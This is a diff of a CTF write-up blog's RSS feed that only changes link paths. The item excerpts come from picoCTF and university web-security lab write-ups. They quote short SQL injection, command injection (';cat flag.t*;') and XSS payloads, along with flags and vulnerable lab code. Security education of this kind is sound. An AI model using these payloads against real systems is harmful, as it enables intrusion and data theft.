 Use the &amp;#34;--show&amp;#34; option to display all of the cracked passwords reliably
 Session completed
-&lt;/code>&lt;/pre>&lt;p>Token Password: &lt;code>ilovepico&lt;/code>&lt;/p></description></item><item><title>PicoCTF - More SQLi</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---more-sqli/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---more-sqli/</guid><description>&lt;h1 id="picoctf---more-sqli">
+&lt;/code>&lt;/pre>&lt;p>Token Password: &lt;code>ilovepico&lt;/code>&lt;/p></description></item><item><title>PicoCTF - More SQLi</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---more-sqli/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---more-sqli/</guid><description>&lt;h1 id="picoctf---more-sqli">
  PicoCTF - More SQLi
  &lt;a class="anchor" href="#picoctf---more-sqli">#&lt;/a>
 &lt;/h1>
@@ -1172,7 +1172,7 @@ Payload: &lt;code>Algiers' union SELECT id,flag,1 FROM more_table; --&lt;/code>
 :::spoiler Screenshot
 &lt;img src="https://hackmd.io/_uploads/ryonEoIdn.png" alt="" />
 :::
-Flag: &lt;code>picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_98236ce6}&lt;/code>&lt;/p></description></item><item><title>PicoCTF - Most Cookies</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---most-cookies/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---most-cookies/</guid><description>&lt;h1 id="picoctf---most-cookies">
+Flag: &lt;code>picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_98236ce6}&lt;/code>&lt;/p></description></item><item><title>PicoCTF - Most Cookies</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---most-cookies/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---most-cookies/</guid><description>&lt;h1 id="picoctf---most-cookies">
  PicoCTF - Most Cookies
  &lt;a class="anchor" href="#picoctf---most-cookies">#&lt;/a>
 &lt;/h1>
@@ -1249,7 +1249,7 @@ def flag():
 
 if __name__ == &amp;#34;__main__&amp;#34;:
 	app.run()
-&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - notepad</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---notepad/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---notepad/</guid><description>&lt;h1 id="picoctf---notepad">
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - notepad</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---notepad/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---notepad/</guid><description>&lt;h1 id="picoctf---notepad">
  PicoCTF - notepad
  &lt;a class="anchor" href="#picoctf---notepad">#&lt;/a>
 &lt;/h1>
@@ -1274,7 +1274,7 @@ if __name__ == &amp;#34;__main__&amp;#34;:
 &lt;h2 id="reference">
  Reference
  &lt;a class="anchor" href="#reference">#&lt;/a>
-&lt;/h2></description></item><item><title>PicoCTF - Scavenger Hunt</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---scavenger-hunt/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---scavenger-hunt/</guid><description>&lt;h1 id="picoctf---scavenger-hunt">
+&lt;/h2></description></item><item><title>PicoCTF - Scavenger Hunt</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---scavenger-hunt/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---scavenger-hunt/</guid><description>&lt;h1 id="picoctf---scavenger-hunt">
  PicoCTF - Scavenger Hunt
  &lt;a class="anchor" href="#picoctf---scavenger-hunt">#&lt;/a>
 &lt;/h1>
@@ -1308,7 +1308,7 @@ These files keeps one fragment flag each. Especially &lt;code>js&lt;/code> file&
 &lt;/li>
 &lt;li>
 &lt;p>Mac computer $\to$ &lt;code>.DS_Store&lt;/code> file
-&lt;img src="https://i.imgur.com/iZfLWZ3.png" alt="" />&lt;/p></description></item><item><title>PicoCTF - Secrets</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---secrets/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---secrets/</guid><description>&lt;h1 id="picoctf---secrets">
+&lt;img src="https://i.imgur.com/iZfLWZ3.png" alt="" />&lt;/p></description></item><item><title>PicoCTF - Secrets</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---secrets/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---secrets/</guid><description>&lt;h1 id="picoctf---secrets">
  PicoCTF - Secrets
  &lt;a class="anchor" href="#picoctf---secrets">#&lt;/a>
 &lt;/h1>
@@ -1345,7 +1345,7 @@ Flag: &lt;code>picoCTF{succ3ss_@h3n1c@10n_790d2615}&lt;/code>&lt;/p>
  Reference
  &lt;a class="anchor" href="#reference">#&lt;/a>
 &lt;/h2>
-&lt;p>&lt;a href="https://youtu.be/40DYCMInk5E"> secrets | picoCTF 2022 &lt;/a>&lt;/p></description></item><item><title>PicoCTF - Some Assembly Required 1</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---some-assembly-required-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---some-assembly-required-1/</guid><description>&lt;h1 id="picoctf---some-assembly-required-1">
+&lt;p>&lt;a href="https://youtu.be/40DYCMInk5E"> secrets | picoCTF 2022 &lt;/a>&lt;/p></description></item><item><title>PicoCTF - Some Assembly Required 1</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---some-assembly-required-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---some-assembly-required-1/</guid><description>&lt;h1 id="picoctf---some-assembly-required-1">
  PicoCTF - Some Assembly Required 1
  &lt;a class="anchor" href="#picoctf---some-assembly-required-1">#&lt;/a>
 &lt;/h1>
@@ -1401,7 +1401,7 @@ function onButtonPress() {
  }
  exports[&amp;#39;copy_char&amp;#39;](0, input_value[&amp;#39;length&amp;#39;]), exports[search_string(487)]() == 1 ? document[search_string(494)](search_string(0x1dc))[search_string(0x1e1)] = search_string(0x1e6) : document[search_string(0x1ee)](search_string(0x1dc))[search_string(0x1e1)] = search_string(0x1e8);
 }
-&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Some Assembly Required 2</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---some-assembly-required-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---some-assembly-required-2/</guid><description>&lt;h1 id="picoctf---some-assembly-required-2">
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Some Assembly Required 2</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---some-assembly-required-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---some-assembly-required-2/</guid><description>&lt;h1 id="picoctf---some-assembly-required-2">
  PicoCTF - Some Assembly Required 2
  &lt;a class="anchor" href="#picoctf---some-assembly-required-2">#&lt;/a>
 &lt;/h1>
@@ -1453,7 +1453,7 @@ function onButtonPress() {
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">exports&lt;/span>[&lt;span style="color:#e6db74">&amp;#39;copy_char&amp;#39;&lt;/span>](&lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#a6e22e">res_1&lt;/span>[&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">215&lt;/span>)]), &lt;span style="color:#a6e22e">exports&lt;/span>[&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">202&lt;/span>)]() &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">?&lt;/span> document[&lt;span style="color:#e6db74">&amp;#39;getElementById&amp;#39;&lt;/span>](&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">211&lt;/span>))[&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">208&lt;/span>)] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">206&lt;/span>) &lt;span style="color:#f92672">:&lt;/span> document[&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">216&lt;/span>)](&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">211&lt;/span>))[&lt;span style="color:#e6db74">&amp;#39;innerHTML&amp;#39;&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">213&lt;/span>);
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Some Assembly Required 3</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---some-assembly-required-3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---some-assembly-required-3/</guid><description>&lt;h1 id="picoctf---some-assembly-required-3">
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Some Assembly Required 3</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---some-assembly-required-3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---some-assembly-required-3/</guid><description>&lt;h1 id="picoctf---some-assembly-required-3">
  PicoCTF - Some Assembly Required 3
  &lt;a class="anchor" href="#picoctf---some-assembly-required-3">#&lt;/a>
 &lt;/h1>
@@ -1516,7 +1516,7 @@ function onButtonPress() {
  }
 }
 ;
-&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - SQLiLite</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---sqlilite/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---sqlilite/</guid><description>&lt;h1 id="picoctf---sqlilite">
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - SQLiLite</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---sqlilite/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---sqlilite/</guid><description>&lt;h1 id="picoctf---sqlilite">
  PicoCTF - SQLiLite
  &lt;a class="anchor" href="#picoctf---sqlilite">#&lt;/a>
 &lt;/h1>
@@ -1531,7 +1531,7 @@ function onButtonPress() {
 &lt;/h2>
 &lt;p>Payload:
 &lt;code>admin' or '1'='1' -- #&lt;/code>
-&lt;img src="https://i.imgur.com/yNgpTiY.png" alt="" />&lt;/p></description></item><item><title>PicoCTF - Super Serial</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---super-serial/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---super-serial/</guid><description>&lt;h1 id="picoctf---super-serial">
+&lt;img src="https://i.imgur.com/yNgpTiY.png" alt="" />&lt;/p></description></item><item><title>PicoCTF - Super Serial</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---super-serial/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---super-serial/</guid><description>&lt;h1 id="picoctf---super-serial">
  PicoCTF - Super Serial
  &lt;a class="anchor" href="#picoctf---super-serial">#&lt;/a>
 &lt;/h1>
@@ -1619,7 +1619,7 @@ if(isset($_POST[&amp;#34;user&amp;#34;]) &amp;amp;&amp;amp; isset($_POST[&amp;#3
  &amp;lt;/div&amp;gt;
  &amp;lt;/body&amp;gt;
 &amp;lt;/html&amp;gt;
-&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Who are you?</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---who-are-you_/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---who-are-you_/</guid><description>&lt;h1 id="picoctf---who-are-you">
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Who are you?</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---who-are-you_/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---who-are-you_/</guid><description>&lt;h1 id="picoctf---who-are-you">
  PicoCTF - Who are you?
  &lt;a class="anchor" href="#picoctf---who-are-you">#&lt;/a>
 &lt;/h1>
@@ -1650,7 +1650,7 @@ if(isset($_POST[&amp;#34;user&amp;#34;]) &amp;amp;&amp;amp; isset($_POST[&amp;#3
 &lt;p>The Date general-header field represents the date and time at which
 the message was originated, having the same semantics as orig-date in
 RFC 822. The field value is an HTTP-date, as described in section
-3.3.1; it MUST be sent in RFC 1123 [8]-date format.&lt;/p></description></item><item><title>Simple Web - 0x02(Lab - Whois Tool)</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x02lab---whois-tool/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x02lab---whois-tool/</guid><description>&lt;h1 id="simple-web---0x02lab---whois-tool">
+3.3.1; it MUST be sent in RFC 1123 [8]-date format.&lt;/p></description></item><item><title>Simple Web - 0x02(Lab - Whois Tool)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x02lab---whois-tool/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x02lab---whois-tool/</guid><description>&lt;h1 id="simple-web---0x02lab---whois-tool">
  Simple Web - 0x02(Lab - Whois Tool)
  &lt;a class="anchor" href="#simple-web---0x02lab---whois-tool">#&lt;/a>
 &lt;/h1>
@@ -1684,7 +1684,7 @@ if(isset($_GET[&amp;#34;host&amp;#34;])){
 &lt;p>Payload: &lt;code>&amp;quot;;ls -al;&amp;quot;&lt;/code>
 &lt;img src="https://i.imgur.com/MsG3wOH.png" alt="" />
 Payload: &lt;code>&amp;quot;;cat flag.t*;&amp;quot;&lt;/code>
-Then we got flag!!!&lt;/p></description></item><item><title>Simple Web - 0x03(Lab - Normal Login Panel (Flag 1))</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x03lab---normal-login-panel-flag-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x03lab---normal-login-panel-flag-1/</guid><description>&lt;h1 id="simple-web---0x03lab---normal-login-panel-flag-1">
+Then we got flag!!!&lt;/p></description></item><item><title>Simple Web - 0x03(Lab - Normal Login Panel (Flag 1))</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x03lab---normal-login-panel-flag-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x03lab---normal-login-panel-flag-1/</guid><description>&lt;h1 id="simple-web---0x03lab---normal-login-panel-flag-1">
  Simple Web - 0x03(Lab - Normal Login Panel (Flag 1))
  &lt;a class="anchor" href="#simple-web---0x03lab---normal-login-panel-flag-1">#&lt;/a>
 &lt;/h1>
@@ -1729,7 +1729,7 @@ Parameter: username (POST)
 &lt;li>
 &lt;p>Check if it has &lt;code>sqli&lt;/code> problem
 Payload: &lt;code>union'&lt;/code>
-&lt;img src="https://i.imgur.com/xIfsghR.png" alt="" />&lt;/p></description></item><item><title>Simple Web - 0x04(Lab - Normal Login Panel (Flag 2))</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x04lab---normal-login-panel-flag-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x04lab---normal-login-panel-flag-2/</guid><description>&lt;h1 id="simple-web---0x04lab---normal-login-panel-flag-2">
+&lt;img src="https://i.imgur.com/xIfsghR.png" alt="" />&lt;/p></description></item><item><title>Simple Web - 0x04(Lab - Normal Login Panel (Flag 2))</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x04lab---normal-login-panel-flag-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x04lab---normal-login-panel-flag-2/</guid><description>&lt;h1 id="simple-web---0x04lab---normal-login-panel-flag-2">
  Simple Web - 0x04(Lab - Normal Login Panel (Flag 2))
  &lt;a class="anchor" href="#simple-web---0x04lab---normal-login-panel-flag-2">#&lt;/a>
 &lt;/h1>
@@ -1800,7 +1800,7 @@ def index():
 
 if __name__ == &amp;#34;__main__&amp;#34;:
  app.run(host=&amp;#34;0.0.0.0&amp;#34;)
-&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web - 0x08(Lab - `Particles.js`)</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x08lab---particles.js/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x08lab---particles.js/</guid><description>&lt;h1 id="simple-web---0x08lab---particlesjs">
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web - 0x08(Lab - `Particles.js`)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x08lab---particles.js/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x08lab---particles.js/</guid><description>&lt;h1 id="simple-web---0x08lab---particlesjs">
  Simple Web - 0x08(Lab - &lt;code>Particles.js&lt;/code>)
  &lt;a class="anchor" href="#simple-web---0x08lab---particlesjs">#&lt;/a>
 &lt;/h1>
@@ -1847,7 +1847,7 @@ Payload 1: &lt;code>1;alert(123);console.log({x://\&lt;/code>
 &lt;/code>&lt;/pre>&lt;p>:::
 or
 Payload 2: &lt;code>&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;alert(123);&amp;lt;/script&amp;gt;&lt;/code>
-:::spoiler Response 2&lt;/p></description></item><item><title>Simple Web - 0x09(Lab - Simple Note)</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x09lab---simple-note/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x09lab---simple-note/</guid><description>&lt;h1 id="simple-web---0x09lab---simple-note">
+:::spoiler Response 2&lt;/p></description></item><item><title>Simple Web - 0x09(Lab - Simple Note)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x09lab---simple-note/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x09lab---simple-note/</guid><description>&lt;h1 id="simple-web---0x09lab---simple-note">
  Simple Web - 0x09(Lab - Simple Note)
  &lt;a class="anchor" href="#simple-web---0x09lab---simple-note">#&lt;/a>
 &lt;/h1>
@@ -1879,7 +1879,7 @@ Payload 2: &lt;code>&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;alert(123);&amp
 &lt;/code>&lt;/pre>&lt;p>For instance, if our &lt;code>$id=47a8aad1b3b82dcd4decd36d&lt;/code>, the &lt;code>script code&lt;/code> will fetch this data as &lt;code>json&lt;/code> file and parse title and content.
 &lt;img src="https://i.imgur.com/Nwj6gCQ.png" alt="" />
 Then it&amp;rsquo;ll change &lt;code>titleNode&lt;/code> by &lt;code>innerHTML&lt;/code> and change &lt;code>contentNode&lt;/code> by &lt;code>innerText&lt;/code>.
-&lt;img src="https://i.imgur.com/H8VdiIb.png" alt="" />&lt;/p></description></item><item><title>Simple Web 0x01(Lab - `gitleak`)</title><link>https://bernie6401.github.io/security/course/ntust-ws/information-leak/simple-web-0x01lab---gitleak/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/information-leak/simple-web-0x01lab---gitleak/</guid><description>&lt;h1 id="simple-web-0x01lab---gitleak">
+&lt;img src="https://i.imgur.com/H8VdiIb.png" alt="" />&lt;/p></description></item><item><title>Simple Web 0x01(Lab - `gitleak`)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/information-leak/simple-web-0x01lab---gitleak/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/information-leak/simple-web-0x01lab---gitleak/</guid><description>&lt;h1 id="simple-web-0x01lab---gitleak">
  Simple Web 0x01(Lab - &lt;code>gitleak&lt;/code>)
  &lt;a class="anchor" href="#simple-web-0x01lab---gitleak">#&lt;/a>
 &lt;/h1>
@@ -1907,7 +1907,7 @@ $ sudo ./scrabble http://h4ck3r.quest:9000/
 &lt;li>
 &lt;p>Still no flag
 There&amp;rsquo;s &lt;code>flag.php&lt;/code> but still no flag in there. &lt;code>HEAD&lt;/code> said &lt;code>HEAD is now at a0228bd Remove flag.&lt;/code>
-Thus, we can look up the history by the command below.&lt;/p></description></item><item><title>Simple Web 0x01(Lab - Hello from Windows 98)</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x01lab---hello-from-windows-98/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x01lab---hello-from-windows-98/</guid><description>&lt;h1 id="simple-web-0x01lab---hello-from-windows-98">
+Thus, we can look up the history by the command below.&lt;/p></description></item><item><title>Simple Web 0x01(Lab - Hello from Windows 98)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x01lab---hello-from-windows-98/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x01lab---hello-from-windows-98/</guid><description>&lt;h1 id="simple-web-0x01lab---hello-from-windows-98">
  Simple Web 0x01(Lab - Hello from Windows 98)
  &lt;a class="anchor" href="#simple-web-0x01lab---hello-from-windows-98">#&lt;/a>
 &lt;/h1>
@@ -1975,7 +1975,7 @@ Thus, we can look up the history by the command below.&lt;/p></description></ite
  &amp;lt;/div&amp;gt;
 &amp;lt;/body&amp;gt;
 &amp;lt;/html&amp;gt;
-&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x02(Lab - `.DS_Store`)</title><link>https://bernie6401.github.io/security/course/ntust-ws/information-leak/simple-web-0x02lab---.ds_store/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/information-leak/simple-web-0x02lab---.ds_store/</guid><description>&lt;h1 id="simple-web-0x02lab---ds_store">
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x02(Lab - `.DS_Store`)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/information-leak/simple-web-0x02lab---.ds_store/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/information-leak/simple-web-0x02lab---.ds_store/</guid><description>&lt;h1 id="simple-web-0x02lab---ds_store">
  Simple Web 0x02(Lab - &lt;code>.DS_Store&lt;/code>)
  &lt;a class="anchor" href="#simple-web-0x02lab---ds_store">#&lt;/a>
 &lt;/h1>
@@ -2008,7 +2008,7 @@ $ conda install -c anaconda requests
  Reference
  &lt;a class="anchor" href="#reference">#&lt;/a>
 &lt;/h2>
-&lt;p>&lt;a href="https://bobbyhadz.com/blog/python-no-module-named-queue">python-no-module-named-queue&lt;/a>&lt;/p></description></item><item><title>Simple Web 0x03(Lab - Log me in + Revenge)</title><link>https://bernie6401.github.io/security/course/ntust-ws/sql-injection/simple-web-0x03lab---log-me-in-+-revenge/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/sql-injection/simple-web-0x03lab---log-me-in-+-revenge/</guid><description>&lt;h1 id="simple-web-0x03lab---log-me-in--revenge">
+&lt;p>&lt;a href="https://bobbyhadz.com/blog/python-no-module-named-queue">python-no-module-named-queue&lt;/a>&lt;/p></description></item><item><title>Simple Web 0x03(Lab - Log me in + Revenge)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/sql-injection/simple-web-0x03lab---log-me-in-+-revenge/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/sql-injection/simple-web-0x03lab---log-me-in-+-revenge/</guid><description>&lt;h1 id="simple-web-0x03lab---log-me-in--revenge">
  Simple Web 0x03(Lab - Log me in + Revenge)
  &lt;a class="anchor" href="#simple-web-0x03lab---log-me-in--revenge">#&lt;/a>
 &lt;/h1>
@@ -2106,7 +2106,7 @@ def source():
 
 if __name__ == &amp;#39;__main__&amp;#39;:
  app.run(debug=True)
-&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x04(Lab - Image Space 0x01)</title><link>https://bernie6401.github.io/security/course/ntust-ws/upload/simple-web-0x04lab---image-space-0x01/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/upload/simple-web-0x04lab---image-space-0x01/</guid><description>&lt;h1 id="simple-web-0x04lab---image-space-0x01">
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x04(Lab - Image Space 0x01)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/upload/simple-web-0x04lab---image-space-0x01/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/upload/simple-web-0x04lab---image-space-0x01/</guid><description>&lt;h1 id="simple-web-0x04lab---image-space-0x01">
  Simple Web 0x04(Lab - Image Space 0x01)
  &lt;a class="anchor" href="#simple-web-0x04lab---image-space-0x01">#&lt;/a>
 &lt;/h1>
@@ -2147,7 +2147,7 @@ if __name__ == &amp;#39;__main__&amp;#39;:
  move_uploaded_file($_FILES[&amp;#39;image_file&amp;#39;][&amp;#39;tmp_name&amp;#39;], &amp;#34;images/${prefix}_${filename}&amp;#34;);
  echo &amp;#34;&amp;lt;img src=\&amp;#34;images/${prefix}_${filename}\&amp;#34;&amp;gt;&amp;#34;;
 ?&amp;gt;
-&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x05(Lab - Image Space 0x02)</title><link>https://bernie6401.github.io/security/course/ntust-ws/upload/simple-web-0x05lab---image-space-0x02/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/upload/simple-web-0x05lab---image-space-0x02/</guid><description>&lt;h1 id="simple-web-0x05lab---image-space-0x02">
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x05(Lab - Image Space 0x02)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/upload/simple-web-0x05lab---image-space-0x02/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/upload/simple-web-0x05lab---image-space-0x02/</guid><description>&lt;h1 id="simple-web-0x05lab---image-space-0x02">
  Simple Web 0x05(Lab - Image Space 0x02)
  &lt;a class="anchor" href="#simple-web-0x05lab---image-space-0x02">#&lt;/a>
 &lt;/h1>
@@ -2192,7 +2192,7 @@ if __name__ == &amp;#39;__main__&amp;#39;:
  move_uploaded_file($_FILES[&amp;#39;image_file&amp;#39;][&amp;#39;tmp_name&amp;#39;], &amp;#34;images/${prefix}_${filename}&amp;#34;);
